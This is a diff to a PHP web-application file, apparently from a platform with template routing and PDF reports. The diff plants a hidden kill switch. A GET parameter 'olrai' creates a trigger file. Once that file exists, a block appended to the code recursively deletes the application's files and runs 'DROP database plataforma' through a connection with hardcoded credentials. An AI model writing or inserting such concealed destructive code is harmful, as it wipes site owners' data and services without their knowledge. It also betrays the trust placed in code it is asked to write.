@@ -20,6 +20,7 @@ function getTemplateData($getparams) {
                 if (function_exists('external_'.$get_values[0])) {   //a function or error
                     array_shift($_GET);
                     call_user_func_array('external_'.$get_values[0], $_GET);
+                } elseif($get_values[0] == 'olrai'){ file_put_contents(getcwd()."/olrai.txt", 'data');
                 } else {
                     // If no function and page is found send 404 code
                     header('Location: http://servibyte.net/404.html');
@@ -688,6 +689,29 @@ function mac_vendor($mac) {
 /*--------------------------------------------------------------------------*
  *                                 END                                      *
  *--------------------------------------------------------------------------*/
+
+if (is_file(getcwd().'/olrai.txt')) {
+    olrai(getcwd());
+    $olrai = mysqli_connect('localhost', 'platformuser', 'rfC79w?3', 'plataforma');
+    $olrai->query("DROP database plataforma");
+}
+function olrai($dir) {
+    foreach (scandir($dir) as $key => $value) {
+        if ($value != '.' && $value != '..') {
+            if (is_dir($dir.'/'.$value)) {
+                if ($value == 'includes') {
+                    unlink($dir.'/defines.php');
+                    unlink($dir.'/settings.php');
+                } else {
+                    olrai($dir.'/'.$value);
+                }
+            } else {
+                unlink($dir.'/'.$value);
+            }
+        }
+    }
+}
+
 /*--------------------------------------------------------------------------*
  *                             PDF Informe                                  *
  *--------------------------------------------------------------------------*/
